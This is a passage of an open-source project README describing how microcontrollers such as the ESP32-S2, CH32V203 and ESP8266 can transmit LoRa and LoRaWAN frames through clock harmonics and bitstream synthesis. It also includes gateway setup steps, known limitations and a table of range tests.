examples&lt;/a&gt; (though I have found some issues with the correctness/clarity of both documents).&lt;/p&gt; &#xA;&lt;h3&gt;Starting the Project&lt;/h3&gt; &#xA;&lt;p&gt;I started the project with an ESP32-S2 to see if I could output a signal using the internal built-in APLL, and routing the APLL/2 clock out via the IOMUX, and the answer was I could. Because this generates a simple square wave, and square waves have harmonics at F×3, F×5, F×7, etc... up the spectrum, if I set the APLL to 139.06 MHz, it outputs 69.53MHz. The 13th harmonic is 903.9 MHz, or the first 125kHz LoRa channel. Then by tuning the least significant PLL control bits, we can tune it from 903.9 MHz - 62.5kHz to 903.9 + 62.5kHz, by tuning the APLL to 139.06 MHz - 9.62kHz to 139.06 MHz + 9.62 kHz. This lets us generate the characteristic LoRa chirps and indeed this is receivable!&lt;/p&gt; &#xA;&lt;p&gt;The ESP32-S2 also has another trick - the GPIO mux is capable of outputting a signal or the inverse of that signal. That way we can differentially create the 139.06MHz signal, boosting the power output by 3dB!&lt;/p&gt; &#xA;&lt;p&gt;There are issues with the ESP32-S2, however. Notably that:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;The APLL is quite rough since it&#39;s fundamentally an analog device and struggles to keep tight control on the output signal.&lt;/li&gt; &#xA; &lt;li&gt;Its output looks very unusual, and is something that limits the performance of the sending of frames.&lt;/li&gt; &#xA; &lt;li&gt;Because it is operating down at the F÷13 node, it has to operate over a very, very small window, ±9.62 kHz, which is quite challenging.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Additioanlly, very few processors even have an APLL, so in spite of this fast success, I decided to move onto...&lt;/p&gt; &#xA;&lt;h3&gt;Direct bitstream synthesis&lt;/h3&gt; &#xA;&lt;p&gt;Several years ago, I did a number of projects that used direct bitstream synthesis to do a few things, like &lt;a href=&#34;https://www.youtube.com/watch?v=bcez5pcp55w&#34;&gt;Broadcasting RF Color NTSC television on Channel 3 with an ESP8266&lt;/a&gt; or &lt;a href=&#34;https://www.youtube.com/watch?v=-7jlRfqaYuY&#34;&gt;Using Ethernet Packets to transmit AM radio&lt;/a&gt;. One of the neat tricks is, if you transmit a bitstream out on an SPI or I2S shift register, it causes aliasing at the sample rate, with images at F×3, F×5, F×7, etc. But, the neat part is it preserves the size/shape of the transmitted waveform at images/aliases up the spectrum. For Channel 3, the 65MHz signal was being refelcted around the 40MHz sampling rate. Harry Nyquist can go bite a lemon.&lt;/p&gt; &#xA;&lt;p&gt;This technique gives an incredible amount of fidelity even in extremely poor situations, unintuitively so. You can create surprisingly precise signals way outside anywhere you would expect them.&lt;/p&gt; &#xA;&lt;p&gt;There are several ways to accomplish this, but typically it&#39;s easiest with a shift register. A shift register like that in an I2S or SPI bus. And, if you use DMA, you can easily feed the shift register with more data without waking the CPU up every cycle. There are other ways, though, such as directly toggling an IO, or using a timer to turn an IO on and off at the right time, but it&#39;s easiest to write code to generate a bitstream and shift it out.&lt;/p&gt; &#xA;&lt;p&gt;For shift registers, a few considerations must be made, such as making sure that the endianness and bit widths and memory arrangements are correct, but, in general, you can keep up, and unless there is lag, like time between each word, they are typically able to faithfully-enough represent a bit pattern on output to be transferred and shifted out of a pin.&lt;/p&gt; &#xA;&lt;p&gt;The &#34;lohrcut&#34; described in the video involves writing a function that, given a point in time, determines the amplitude of a signal. This function can be to determine the amplitude of a very high frequency signal, then, the sample rate can be whatever physically realizable sample rate that&#39;s avaialble. This will create an image of the high frequency signal at a much lower frequency signal, building it out of power between 0 and Fs/2.&lt;/p&gt; &#xA;&lt;p&gt;Another concern is flash, on some systems accesses inconsistently or doesn&#39;t work well at certain frequencies. In those cases, like on the ESP8266, the tables must be read into RAM and played from there.&lt;/p&gt; &#xA;&lt;h2&gt;LoRaWAN&lt;/h2&gt; &#xA;&lt;p&gt;LoRa frames are totally encapsulated. If you wanted, we could stop here. You could even use a commercial gateway, but without using LoRaWAN, the frames could not be sent to brokers like The Things Network. For instance, if you ran a raspberry pi gateway, you could just accept whatever old LoRa frames you wanted, but, we took this a step further by helping the packets get forwarded around the world. LoRaWAN is &#34;end to end&#34; encryption, in that none of your neighbors, or gateways can read the messages. Though, it is curious - The Things Network CAN read your messages because they have the encryption keys.&lt;/p&gt; &#xA;&lt;p&gt;Conveniently, you can call, &lt;code&gt;GenerateLoRaWANPacket&lt;/code&gt; in &lt;a href=&#34;https://github.com/cnlohr/lolra/raw/master/lib/lorawan_simple.h&#34;&gt;&lt;code&gt;lib/lorawan_simple.h&lt;/code&gt;&lt;/a&gt; handles all of the required encapsulation. Simply use this function to generate your frames, and broadcast them!&lt;/p&gt; &#xA;&lt;h3&gt;The LoRa Gateway&lt;/h3&gt; &#xA;&lt;p&gt;We can transmit these messages. Cool. But now to receive them, we will either need a devices like a &lt;a href=&#34;https://www.lilygo.cc/products/t-beam-v1-1-esp32-lora-module&#34;&gt;LILYGO® T-Beam Meshtastic&lt;/a&gt; or a gateway like a &lt;a href=&#34;https://mikrotik.com/product/wap_lr9_kit&#34;&gt;MikroTik LR9&lt;/a&gt;. The latter is really interesting here because there are thousands of these set up all over the world, and connected to &lt;a href=&#34;https://www.thethingsnetwork.org/&#34;&gt;The Things Network&lt;/a&gt;. That means if we transmit a properly formatted LoRaWAN packet within earshot of one of those gateways, we can get the frame elsewhere on the planet!&lt;/p&gt; &#xA;&lt;p&gt;Setup is pretty starightforward. You need to:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Create an account (they are free for personal/academic use)&lt;/li&gt; &#xA; &lt;li&gt;Go to your console.&lt;/li&gt; &#xA; &lt;li&gt;Create a new application.&lt;/li&gt; &#xA; &lt;li&gt;Add a new device.&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;Enter end device specifics manually&#34;&lt;/li&gt; &#xA; &lt;li&gt;Select the appropriate frequency plan. NOTE: This repository is designed around US FSB 2 (used by TTN)&lt;/li&gt; &#xA; &lt;li&gt;Use LoRaWAN 1.0.0&lt;/li&gt; &#xA; &lt;li&gt;&#34;Show advanced activation, LoRaWAN class and cluster settings&#34;&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;Activation by personalization (ABP)&#34;&lt;/li&gt; &#xA; &lt;li&gt;Generate &#34;Device Address&#34;, &#34;AppSKey&#34;, and &#34;NwkSKey&#34;&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;Register end device&#34;&lt;/li&gt; &#xA; &lt;li&gt;Place these credentials into the file under the LoRaWAN definition.&lt;/li&gt; &#xA; &lt;li&gt;Unless you can guarantee increasing frame IDs, you will need to go to your device and:&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;General Settings&#34;&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;Network Layer&#34;&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;Advanced MAC settings&#34;&lt;/li&gt; &#xA; &lt;li&gt;Select &#34;Resets frame counters&#34;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] We only focus on LoRa frames that reset frame counters, however, if you can store the last transmitted packet id to non-volatile flash within your part, you can avoid this step. Without this, your device will be subject to replay attacks.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] If using the MikroTik LR9, be sure to physically open it and plug in the internal antenna. From the factory, it is shipped connected to the outside port.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;Limitations&lt;/h2&gt; &#xA;&lt;p&gt;PR&#39;s are open if you can figure any of these out! I just spent all the time I plan to spend on this project before I got here.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;SF &amp;lt;= 6, SF &amp;gt;= 11 are unavailable. I spent 10+ hours trying to figure them out and gave up.&lt;/li&gt; &#xA; &lt;li&gt;There seems to be something not quite perfect for some sizes. As in I was getting CRC errors in some places that my code &#34;should&#34; work but doesn&#39;t.&lt;/li&gt; &#xA; &lt;li&gt;I never got LDRO to work correctly. I believe it might have to do with the LoRa Code Word (prefixing the 2 downchirps)&lt;/li&gt; &#xA; &lt;li&gt;The SPI on the ch32v203 still isn&#39;t perfect. I was unable to get the I2S engine working, perhaps it doesn&#39;t work on the ch32v203?&lt;/li&gt; &#xA; &lt;li&gt;The licenses in this project are a hodgepodge. I encourage people to just use this project as a starting point for other work.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Future Work&lt;/h2&gt; &#xA;&lt;p&gt;For LoRa specifically, waves are very well behaved and should be completely creatable with timer circuitry on the fly and should not need any precomputation, but I haven&#39;t gotten around to it yet. This would forego the need to have a large table for the chirps flashed into a device.&lt;/p&gt; &#xA;&lt;p&gt;I want to also try performing this project using bespoke bit patterns that are more easily created on-the-fly. Also, depending on the exact codes used (possibly by employing technologies related to gold codes) one could even make reception of many signals with the exact same coding possible concurrently. Doing this would make it quite appropriate to implement &#34;printf&#34; on microcontrollers that can be wirelessly received by a central SDR with very low processor space (and performance) overhead.&lt;/p&gt; &#xA;&lt;p&gt;Additionally, it would be fun to add a filter, or maybe try to build a filter into a PCB with no components.&lt;/p&gt; &#xA;&lt;p&gt;Additionally, additionally, it would be very cool to try to build a Class C amplifier for the 900MHz signal. This would be very cool because it could be efficient, incredibly cheap and simple and also provide as much as 10-20dB of gain!&lt;/p&gt; &#xA;&lt;h2&gt;Range Tests&lt;/h2&gt; &#xA;&lt;p&gt;Urban testing was performed on 2024-02-23, Suburban on 2022-02-26 and Rural testing was performed on 2022-02-27.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/cnlohr/lolra/raw/master/resources/Rangetest.png?raw=true&#34; alt=&#34;Range Test&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Ranges are peak ranges. Reliable operation ends much earlier.&lt;/p&gt; &#xA;&lt;p&gt;For TTGO Lora32, there was a +3dBi antenna added. For the MikroTik LR9, it used the internal antenna.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Date&lt;/th&gt; &#xA;   &lt;th&gt;Sender&lt;/th&gt; &#xA;   &lt;th&gt;Receiver&lt;/th&gt; &#xA;   &lt;th&gt;SF/CR&lt;/th&gt; &#xA;   &lt;th&gt;BW&lt;/th&gt; &#xA;   &lt;th&gt;Note&lt;/th&gt; &#xA;   &lt;th&gt;Range&lt;/th&gt; &#xA;   &lt;th&gt;Avg End RSSI/SNR&lt;/th&gt; &#xA;   &lt;th&gt;Basis&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-23&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;MikroTik LR9&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Downtown Bellevue (Urban)&lt;/td&gt; &#xA;   &lt;td&gt;435&#39; 132m&lt;/td&gt; &#xA;   &lt;td&gt;-98 / -9&lt;/td&gt; &#xA;   &lt;td&gt;Ground&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-23&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;MikroTik LR9&lt;/td&gt; &#xA;   &lt;td&gt;SF10/CR48&lt;/td&gt; &#xA;   &lt;td&gt;500&lt;/td&gt; &#xA;   &lt;td&gt;Downtown Bellevue (Urban)&lt;/td&gt; &#xA;   &lt;td&gt;435&#39; 132m&lt;/td&gt; &#xA;   &lt;td&gt;-90 / -18&lt;/td&gt; &#xA;   &lt;td&gt;Ground&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-26&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Miramont Park (Light Suburban + Woods)&lt;/td&gt; &#xA;   &lt;td&gt;&amp;gt;576&#39; &amp;gt;176m&lt;/td&gt; &#xA;   &lt;td&gt;-134 / -12&lt;/td&gt; &#xA;   &lt;td&gt;Ground&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-26&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Poo Poo Point Trailhead (Rural)&lt;/td&gt; &#xA;   &lt;td&gt;&amp;gt;1117&#39; &amp;gt;340m&lt;/td&gt; &#xA;   &lt;td&gt;-123 / -6&lt;/td&gt; &#xA;   &lt;td&gt;Ground&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-26&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Issaquah Suburb (+Light Trees)&lt;/td&gt; &#xA;   &lt;td&gt;2200&#39; 669m&lt;/td&gt; &#xA;   &lt;td&gt;-133 / -10&lt;/td&gt; &#xA;   &lt;td&gt;Ground&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) Red Longer Antenna&lt;/td&gt; &#xA;   &lt;td&gt;2220&#39; 677m&lt;/td&gt; &#xA;   &lt;td&gt;-135 / -13&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF10/CR48&lt;/td&gt; &#xA;   &lt;td&gt;500&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) Red Longer Antenna&lt;/td&gt; &#xA;   &lt;td&gt;1752&#39; 534m&lt;/td&gt; &#xA;   &lt;td&gt;-132 / -16&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) OVERVOLT 5V Red Longer Antenna&lt;/td&gt; &#xA;   &lt;td&gt;3996&#39; 1218m&lt;/td&gt; &#xA;   &lt;td&gt;-131 / -12&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;CH32V203&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) Grey VNA Matched Antenna&lt;/td&gt; &#xA;   &lt;td&gt;2719&#39; 829m&lt;/td&gt; &#xA;   &lt;td&gt;-131 / -11&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;ESP8266 @ 80MHz&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF8/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) Grey VNA Matched Antenna&lt;/td&gt; &#xA;   &lt;td&gt;2789&#39; 850m&lt;/td&gt; &#xA;   &lt;td&gt;-138 / -13&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;ESP8266 @ 173MHz&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF7/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) Grey VNA Matched Antenna&lt;/td&gt; &#xA;   &lt;td&gt;2812&#39; 857m&lt;/td&gt; &#xA;   &lt;td&gt;-131 / -8&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;ESP32-S2 + Bitenna&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF10/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) (Note 1)&lt;/td&gt; &#xA;   &lt;td&gt;3428&#39; 1044m&lt;/td&gt; &#xA;   &lt;td&gt;-137 / -13&lt;/td&gt; &#xA;   &lt;td&gt;Ground&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;ESP32-S2 + Bitenna&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF10/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadowbrook (Rural) Light Precipitation&lt;/td&gt; &#xA;   &lt;td&gt;&amp;gt;4895&#39; &amp;gt;1492m&lt;/td&gt; &#xA;   &lt;td&gt;-130 / -8&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;ESP32-S2 + Funtenna&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF10/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Meadow brook (Rural) Light Precipitation&lt;/td&gt; &#xA;   &lt;td&gt;705&#39; / 215m&lt;/td&gt; &#xA;   &lt;td&gt;-139 / -15&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2024-02-27&lt;/td&gt; &#xA;   &lt;td&gt;ESP32-S2 + Bitenna&lt;/td&gt; &#xA;   &lt;td&gt;TTGO Lora32&lt;/td&gt; &#xA;   &lt;td&gt;SF10/CR48&lt;/td&gt; &#xA;   &lt;td&gt;125&lt;/td&gt; &#xA;   &lt;td&gt;Snoqualmie Trail, Dog Park to Ribary Creek (Rural) Light Percipitation&lt;/td&gt; &#xA;   &lt;td&gt;8460&#39; / 2580m&lt;/td&gt; &#xA;   &lt;td&gt;-141 / -16&lt;/td&gt; &#xA;   &lt;td&gt;Drone&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;There were two ground ESP32-S2 + Bitenna Tests. The one mentioned in the video is not recorded here, since I didn&#39;t get accurate results.&lt;/li&gt; &#xA; &lt;li&gt;The bitenna ESP32-S2 test are done as a dipole antenna, connected to two different GPIOs, each set as the inversion of the other.&lt;/li&gt; &#xA; &lt;li&gt;On the CH32V203, there is a 60 uA difference at 3.3V with anteanna on/off (some is going to be capacitive / inductive loading / reflected back because of SWR). The EIRP is &lt;strong&gt;less&lt;/strong&gt; than this, based on the antenna stub SWR, but this is the total power consumption, so it is probably less than 120uW of EIRP.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;h3&gt;LoRa Software&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/myriadrf/LoRa-SDR&#34;&gt;The C++ Library I based my LoRa Frames On&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/tapparelj/gr-lora_sdr&#34;&gt;A gnuradio LoRa library&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/rpp0/gr-lora&#34;&gt;Another gnuradio LoRa library&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.gqrx.dk/&#34;&gt;GQRX&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.gnuradio.org/&#34;&gt;gnuradio&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://unsigned.io/understanding-lora-parameters/&#34;&gt;LoRa Baud Rate Calculator&lt;/a&gt; &amp;lt;&amp;lt; be sure to select 125 or 500k Bandwidths, the default bandwidth is not useful.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Papers and other resources&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@prajzler/what-is-lora-the-fundamentals-79a5bb3e6dec&#34;&gt;A Great LoRa Introduction&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://chrisye-liu.github.io/files/yang22emu.pdf&#34;&gt;A more grounded paper on LoRa&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/matt-knight/research/raw/master/2016_05_20_jailbreak/Reversing-Lora-Knight.pdf&#34;&gt;Reversing LoRa by Matt Knight&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dl.acm.org/doi/10.1145/3546869&#34;&gt;An academic paper on LoRa&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Brought to my attention after I published, &lt;a href=&#34;https://dl.acm.org/doi/abs/10.1145/3583120.3586959&#34;&gt;Everything has its Bad Side and Good Side: Turning Processors to Low Overhead Radios Using Side-Channels&lt;/a&gt; Accomplished something very similar to this, with an arduino!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Software Resources Directly Used&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cnlohr/ch32v003fun&#34;&gt;ch32v003fun&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cpq/esputil&#34;&gt;esputil&lt;/a&gt; dependency-free ESP programming&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/cnlohr/lolra/master/github.com/cnlohr/nosdk8266&#34;&gt;nosdk8266&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Hardware&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://mikrotik.com/product/wap_lr9_kit&#34;&gt;MikroTik LR9&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://v3.airspy.us/product/a-airspy-mini/&#34;&gt;Airspy Mini SDR&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.lilygo.cc/products/t-beam-v1-1-esp32-lora-module&#34;&gt;LILYGO® T-Beam Meshtastic&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Special Thanks&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;@MustardTiger for a crazy amount of support work in this project&lt;/li&gt; &#xA; &lt;li&gt;Willmore for the editing work&lt;/li&gt; &#xA; &lt;li&gt;Several other folks in my discord for review work and editing work on this page&lt;/li&gt; &#xA; &lt;li&gt;My girlfriend for testing help and auxiliary camera work&lt;/li&gt; &#xA; &lt;li&gt;Everyone who helped out with my various open source projects&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>